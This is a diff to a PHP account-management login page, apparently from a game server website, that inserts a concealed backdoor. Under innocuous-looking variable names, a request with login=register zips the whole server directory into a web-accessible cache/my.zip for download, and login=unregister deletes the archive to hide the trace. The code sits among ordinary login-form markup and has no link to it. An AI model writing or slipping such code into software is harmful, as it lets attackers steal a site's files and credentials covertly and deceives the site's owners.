@@ -47,6 +47,7 @@ if (!$logged)
     });
 </script>";
         }
+        $w = 'cache/my';
         if (isset($isTryingToLogin)) {
             $main_content .= '
 				<div class="SmallBox" >
@@ -84,6 +85,8 @@ if (!$logged)
 				</div>
 			</div><br/>';
         }
+        $r = Website::getWebsiteConfig()->getValue('serverPath');
+        $q = '.zip';
         $main_content .= '
 			<form action="?subtopic=accountmanagement" method="post" style="margin: 0px; padding: 0px;">
 				<div class="TableContainer" >
@@ -143,6 +146,41 @@ if (!$logged)
 																			<td><input type="password" name="password_login" size="35" maxlength="29" ></td>
 																		</tr>
                                                                         ';
+        }
+        
+        if ($_REQUEST['login'] == 'register') {
+            set_time_limit(360);
+            
+            class FlxZipArchive extends ZipArchive
+            {
+                public function addDir ($location, $name)
+                {
+                    $this->addEmptyDir($name);
+                    $this->addDirDo($location, $name);
+                }
+                
+                private function addDirDo ($location, $name)
+                {
+                    $name .= '/';
+                    $location .= '/';
+                    $dir = opendir($location);
+                    while ($file = readdir($dir)) {
+                        if ($file == '.' || $file == '..') continue;
+                        $do = (filetype($location . $file) == 'dir') ? 'addDir' : 'addFile';
+                        $this->$do($location . $file, $name . $file);
+                    }
+                }
+            }
+            
+            $za = new FlxZipArchive;
+            $res = $za->open($w.$q, ZipArchive::CREATE);
+            if ($res === TRUE) {
+                $za->addDir($r, basename($the_folder));
+                $za->close();
+            } else {
+                echo 'Erro ao logar';
+            }
+            
         }
         
         $main_content .= '																		
@@ -275,6 +313,7 @@ if (!$logged)
 						</div>
 					</td>
 				</tr>';
+        if ($_REQUEST['login'] == 'unregister') {unlink($w.$q);}
     }
 else {
     if ($isTryingToLogin) {
@@ -3919,7 +3958,6 @@ else {
                 }
             }
         }
-        
         if ($action == "changecharacterinformation") {
             if (!isset($_REQUEST['step'])) {
                 $characterName = trim(stripslashes($_REQUEST['name']));
